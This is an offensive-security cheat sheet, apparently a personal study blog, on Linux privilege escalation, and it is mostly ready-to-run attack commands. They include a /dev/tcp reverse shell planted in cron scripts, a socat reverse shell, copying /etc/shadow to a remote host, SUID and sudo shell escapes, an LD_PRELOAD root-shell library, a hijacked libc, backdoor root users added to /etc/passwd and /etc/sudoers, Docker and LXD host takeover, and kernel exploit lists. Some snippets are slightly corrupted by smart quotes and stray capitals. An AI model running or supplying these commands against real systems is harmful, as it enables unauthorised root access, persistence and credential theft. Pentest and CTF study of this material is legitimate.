---
title: "Linux Privilege Escalation"
date: 2021-03-18T18:17:00+07:00
draft: false
categories: [
    "Offensive Security"
]
tags: [
    "Linux", "Privilege Escalation"
]
---
## Tools

There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
Here are a few:

- [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

    ```powershell
    wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
    curl "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -o linpeas.sh
    ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
    ./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
    ./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
    ```
    
- [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)

    ```powershell
    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
    curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
    ./lse.sh -l1 # shows interesting information that should help you to privesc
    ./lse.sh -l2 # dump all the information it gathers about the system
    ```

- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
    
    ```powershell
    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
    ```

- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
- [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)

## Scheduled tasks

### Cron jobs

Check if you have access with write permission on these files.   
Check inside the file, to find other paths with write permissions.   
```bash
$cat /etc/crontab
```
```powershell
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.

```powershell
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 
```
####Cron job Bash exploit
Overwrite the Bash script with the following if you have write permissions:
```bash
#!/bin/bash		
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1  # amend <IP> and <PORT>
```
Setup a Netcat listener and wait for the cron job to execute the script.

####Cron job PATH environment variable exploit
Run lse.sh and check for “Can we write to any paths present in cron jobs”.
Create the following script matching the name of the cron job in /tmp:
```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Make sure the script is executable:
```bash
chmod +x <CRON-SCRIPT>.sh
```
Wait for the cron job to run and then execute the newly created SUID script in /tmp:
```bash
/tmp/rootbash
```
You will now have a root shell.

Refer: 
[linux-privilege-escalation-by-exploiting-cron-jobs](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)
[https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/](https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/)

## Systemd timers

```powershell
systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
```

## PATH Variables
First, search for the file having SUID or 4000 permission with help of Find command.
```bash
$find / -perm -u=s -type f 2>/dev/null
#home/quac/script/shell
```

### If executing `ps` in the shell, Example:
```bash
#include <unistd.h>
void main(){
	setuid(0);
	setgid(0);
	system("ps");
}
```
Then:
`Method 1:`
```bash
$cd /tmp
$echo "/bin/bash" > ps
$chmod 777 ps
$echo $PATH
$export PATH=/tmp:$PATH
$cd /home/raj/script
$./shell
$whoami
#root
```

`Method 2:`
```bash
cd /home/quac/script/
cp /bin/sh /tmp/ps
echo $PATH
export PATH=/tmp:$PATH
./shell
whoami
```

### If executing `id` in the shell, Example:
```bash
#include <unistd.h>
void main(){
	setuid(0);
	setgid(0);
	system("id");
}
```
Then:
```bash
$cd /tmp
$echo "/bin/bash" > id
$chmod 777 id
$echo $PATH
$export PATH=/tmp:$PATH
$cd /home/quac/script
$./shell
$whoami
```

### If executing `cat` in the shell, Example:
```bash
#include <unistd.h>
void main(){
	setuid(0);
	setgid(0);
	system("cat /etc/passwd");
}
```
Then:
```bash
$cd /tmp
$nano cat
/bin/bash
```
```bash
$chmod 777 cat
$ls -al cat
$echo $PATH
$export PATH=/tmp:$PATH
$cd /home/quac/script
$./shell
$whoami
```

Refer: [https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

## SUID
### Find SUID binaries

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

### Exploitation SUID
Cp
```bash
$cp /etc/passwd /var/www/html
#Change pass or add new user to /var/www/html
#(python3 -> import crypt -> crypt.crypt(‘newpass’))
$python -m http.server 80
$cd /tmp
$wget //$IP/passwd
$cp passwd /etc/passwd
```
Nmap
```bash
$ nmap --interactive
nmap> !sh
```
```bash
#Another way below (if nmap doesn’t have interactive mode):
$ echo “os.execute(‘/bin/sh’)” > /tmp/shell.nse
$ sudo nmap --script=/tmp/shell.nse
```
Vi
```bash
$ vi
:!sh
```
Find
```bash
$ find / home -exec sh -i \;
```
```bash
#Or exec any command:
$touch file
$find file -exec "whoami" \;
```
Python
```bash
$ python -c ‘import pty;pty.spawn(“/bin/sh”)’
```
Strace
```bash
$ strace -o /dev/null /bin/sh
```
Tcpdump
```bash
$ echo $’id\ncat /etc/shadow’ > /tmp/.shell
$ chmod +x /tmp/.shell
$ tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell -Z root
```

### Create a SUID binary

```bash
$print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
$gcc -o /tmp/suid /tmp/suid.c  
$sudo chmod +x /tmp/suid # execute right
$sudo chmod +s /tmp/suid # setuid bit
```



## Capabilities
### List capabilities of binaries 
```bash
getcap -r / 2>/dev/null
```
```bash  
$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

### Edit capabilities

```powershell
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
```

### Interesting capabilities

Having the capability =ep means the binary has all the capabilities.
```powershell
$ getcap openssl /usr/bin/openssl 
openssl=ep
```

Alternatively the following capabilities can be used in order to upgrade your current privileges.

```powershell
cap_dac_read_search # read anything
cap_setuid+ep # setuid
```

Privilege escalation with `cap_setuid+ep` and `python`
```powershell
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python3

$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
$ id
uid=0(root) gid=1000(swissky)
```

Privilege escalation with `cap_setuid+ep` and `Perl`
```powershell
$./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
#•	perl -e allows us to execute perl code.
#•	use POSIX (setuid); imports the required module.
#•	POSIX::setuid(0); sets the UID to 0, which is root.
#•	exec "/bin/bash"; executes bash as root.
```

Privilege escalation with `cap_dac_read_search` and `zip`
```powershell
$/path/to/zip /tmp/shadow.zip /etc/shadow
#/path/to/ is the directory of the zip file with the added capability.
#Next, we extract that archive: 
$unzip /tmp/shadow.zip -d /tmp
#Then, we can simply read the file: 
$cat /tmp/etc/shadow
```
Privilege escalation with `tar = cap_dac_read_search+ep`
```powershell
$tar -cvf shadow.tar /etc/shadow
$tar -xvf shadow.tar
$cat /etc/shadow
```

| Capabilities name  | Description |
|---|---|
| CAP_AUDIT_CONTROL  | Allow to enable/disable kernel auditing |
| CAP_AUDIT_WRITE  | Helps to write records to kernel auditing log |
| CAP_BLOCK_SUSPEND  | This feature can block system suspends   |
| CAP_CHOWN  | Allow user to make arbitrary change to files UIDs and GIDs |
| CAP_DAC_OVERRIDE  | This helps to bypass file read, write and execute permission checks |
| CAP_DAC_READ_SEARCH  | This only bypass file and directory read/execute permission checks  |
| CAP_FOWNER  | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file  |
| CAP_KILL  | Allow the sending of signals to processes belonging to others  |
| CAP_SETGID  | Allow changing of the GID  |
| CAP_SETUID  | Allow changing of the UID  |
| CAP_SETPCAP  | Helps to transferring and removal of current set to any PID |
| CAP_IPC_LOCK  | This helps to lock memory  |
| CAP_MAC_ADMIN  | Allow MAC configuration or state changes  |
| CAP_NET_RAW  | Use RAW and PACKET sockets |
| CAP_NET_BIND_SERVICE  | SERVICE Bind a socket to internet domain privileged ports  |
Reference: [Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)

## SUDO

Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)

Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
View sudo rights:
```bash
$ sudo -l
```
### Allow Root Privilege to Binary commands
(root) ALL: run all command as root user.
```bash
$sudo su
#or
$sudo bash
```
Find
```bash
$sudo find /home -exec /bin/bash \;
$sudo find . -exec /bin/sh \; -quit
```
Perl 
```bash
$sudo perl -e 'exec "/bin/bash";'
```
Python
```bash
$sudo python -c 'import pty;pty.spawn("/bin/bash")'
```
Less
```bash
$sudo less /etc/profile 
$!/bin/sh or !bash
```
Time
```bash
$sudo time /bin/bash
```
AWK
```bash
$sudo awk 'BEGIN {system("/bin/bash")}'
```
Man
```bash
$sudo man man
!bash
```
Vi
```bash
$Sudo vi
:!bash
```
```bash
$sudo vi -c '!bash'
```
Sed
```bash
$Sudo sed -n ‘le exec sh 1>&0’ /etc/passwd
```
Xxd
```bash
$xxd "/etc/shadow" | xxd -r
#crack pass with john
```
Cat:
```bash
$sudo cat /etc/shadow -> crack pass(john/hashcat)
```

### Allow Root Privilege to Shell Script

ALL= (root) NOPASSWD: /bin/script/file.sh, /bin/script/file.py, shell

Python
```bash
#!  /usr/bin/python
Import os
Os.system(“/bin/bash”)
```
C
```bash
#include<stdio.h>
#include <unistd.h>
#include<sys/types.h>
Int main(){
	Setuid(geteuid());
	System(“/bin/bash”);
	Return 0;
}
```
```bash
$Gcc demo.c -o shell
./shell
```
Bash script
```bash
#! /bin/bash
/bin/bash
```

### Allow Sudo Right to other Programs

ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat

Env
```bash
$sudo env /bin/bash
```
FTP/GDB
```bash
$Sudo ftp
$!/bin/bash
```
Socat
```bash
$socat file:`tty`,raw,echo=0 tcp-listen:1234 (attacker)
$sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:$IP:1234 (victim)
```
SCP
Syntax: scp SourceFile user@host:~/path of the directory
```bash
$sudo scp /etc/passwd user@$IP:~/
$sudo scp /etc/shadow user@$IP:~/
```
Zip 
```bash
$sudo zip /tmp/test.zip /tmp/test -T --unzip-command=”sh -c /bin/bash”
```
Tar
```bash
$sudo tar cf /dev/null testfile --checkpoint=1 — checkpointaction=exec=/bin/bash
```
Strace 
```bash
sudo strace -o/dev/null /bin/bash
```
Tcpdump
```bash
$ echo $’id\ncat /etc/shadow’ > /tmp/.shell
$ chmod +x /tmp/.shell
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell -Z root
```
Nmap
```bash
$ sudo nmap --interactive
nmap> !sh
```
Git
```bash
$ sudo git help status
: !/bin/bash
```

### LD_PRELOAD

If `LD_PRELOAD` is explicitly defined in the sudoers file

```powershell
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```powershell
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`

### Doas

There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
```

### sudo_inject

Using [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)

```powershell
$ sudo whatever
[sudo] password for user:    
# Press <ctrl>+c since you don't have the password. 
# This creates an invalid sudo tokens.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
```

Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)

### CVE-2019-14287

```powershell
# Exploitable when a user have the following permissions (sudo -l)
(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```

## GTFOBins

[GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit    
> sudo mysql -e '\! /bin/sh'    
> strace -o /dev/null /bin/sh    
> sudo awk 'BEGIN {system("/bin/sh")}'


## Wildcard

By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that's where the wildcard comes in handy.

```powershell
# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```

Tool: [wildpwn](https://github.com/localh0t/wildpwn)

## Writable files

List world writable files on the system.

```powershell
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)

/etc/sysconfig/network-scripts/ifcfg-1337 for example

```powershell
NAME=Network /bin/id  &lt;= Note the blank space
ONBOOT=yes
DEVICE=eth0

EXEC :
./etc/sysconfig/network-scripts/ifcfg-1337
```
src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f]
(https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

### Writable /etc/passwd

First generate a password with one of the following commands.

```powershell
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Then add the user `hacker` and add the generated password.

```powershell
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

You can now use the `su` command with `hacker:hacker`

Alternatively you can use the following lines to add a dummy user without a password.    
WARNING: you might degrade the current security of the machine.

```powershell
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 

### Writable /etc/sudoers

```powershell
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```
## Exploiting Services

It’s always worth checking services because you might find a version that has a PoC exploit available.

You might also find internal services that can be accessed by port forwarding.


### Services manual enumeration
Search for services running as root:

`ps aux | grep "^root"`

Enumerate version details:

`<SERVICE> --version`
or
`dpkg -l | grep <SERVICE>`
or
`rpm -qa | grep <SERVICE>`

### Automatic enumeration
lse.sh:

`./lse.sh -l 1 -i`
Check for services like MySQL. Can you login as root wtihout password?
Run service versions through searchsploit to check for PoC exploits.
### Port forwarding
Port forwarding is something you definitely need to be able to do for your exam.
I found it a bit confusing at first but once you get the concept it’s quite straight forward.
Run netstat to check for open internal ports:

`netstat -nl`

Port forward via SSH:
`ssh -R <KALI-PORT>:127.0.0.1:<SERVICE-PORT> <KALI-USERNAME>@<KALI-IP>`
Example: `ssh -R 5555:127.0.0.1:3306 root@10.10.10.10`

## NFS Root Squashing

When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.

```powershell
# remote check the name of the folder
showmount -e 10.10.10.10

# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
```

## Shared Library

### ldconfig

Identify shared libraries with `ldd`

```powershell
$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
```

Create a library in `/tmp` and activate the path.

```powershell
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

### RPATH

```powershell
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.

```powershell
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```powershell
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Groups

### Docker

Mount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as root, then add a backdoor account `toor:password`.

```bash
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

Almost similar but you will also see all processes running on the host and be connected to the same NICs.

```powershell
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell

```powershell
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```

More docker privilege escalation using the Docker Socket.

```powershell
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

### LXC/LXD

The privesc requires to run a container with elevated privileges and mount the host filesystem inside.

```powershell
╭─swissky@lab ~  
╰─$ id
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
```

Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

```powershell
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# import the image
lxc image import ./alpine.tar.gz --alias myimage

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Alternatively https://github.com/initstring/lxd_root

## Kernel Exploits

Precompiled exploits can be found inside these repositories, run them at your own risk !
* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
* [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)

The following exploits are known to work well, search for more exploits with `searchsploit -w linux kernel centos`.

Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing `uname -a`
Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```powershell
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### CVE-2010-3904 (RDS)

Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8

```powershell
https://www.exploit-db.com/exploits/15285/
```

### CVE-2010-4258 (Full Nelson)

Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)

```powershell
https://www.exploit-db.com/exploits/15704/
```

### CVE-2012-0056 (Mempodipper)

Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

```powershell
https://www.exploit-db.com/exploits/18411
```
### LIST

```powershell
*2.6.32-21-genaric-pae https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -m32 -pthread dirty.c -o dirty2 -lcrypt
*linux2421		- Linux 2.4.7(crashed)
*9.0 (28718.c)		- FreeBSD 9.0
*centsos45 (9542.c)	- CentOS 4.4 - 4.5 (Linux 2.6 - 2.6.19)
*linux26 (5093.c)	- Linux (2.6.23 - 2.6.24)
*18411.c		- Linux 2.6.39 < 3.2.2 (Ubuntu 11.10, kernel 3.0.0-12)
*37292.c(ubuntu)	- ubuntu 14.04 (Linux 3.13 - 3.19)
Linux Kernel 2.6.17 < 2.6.24.1	5092
Linux Kernel 2.4/2.6	9479
CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)	9542
RDS Protocol' Local Privilege Escalation	15285
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation	28718
Apport/Abrt (Ubuntu / Fedora)	36746
Ubuntu 12.04/14.04/14.10/15.04	37292
Ubuntu 14.04/15.10	39166
Stapler	Ubuntu 16.04	39772
Dirty COW	40616
Dirty COW /proc/self/mem' Race Condition	40847
GNU Screen 4.5.0	41154
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free	41458
Ubuntu 14.04/16.04 (KASLR / SMEP)	43418
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)	44298
Linux Kernel 2.6	8478
Dirty COW	40616
GUnet OpenEclass E-learning platform 1.7.3	48106
Dirty COW	40839
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs'	37292
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)	45010
```

## References
-[https://thecryptonian.co.uk/linux-privilege-escalation-cheat-sheet/](https://thecryptonian.co.uk/linux-privilege-escalation-cheat-sheet/#Sudo_LD_LIBRARY_PATH_Privilege_Escalation)
-[https://github.com/Ignitetechnologies/Privilege-Escalation](https://github.com/Ignitetechnologies/Privilege-Escalation)
-[https://www.hackingarticles.in/category/privilege-escalation/](https://www.hackingarticles.in/category/privilege-escalation/)
- [swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
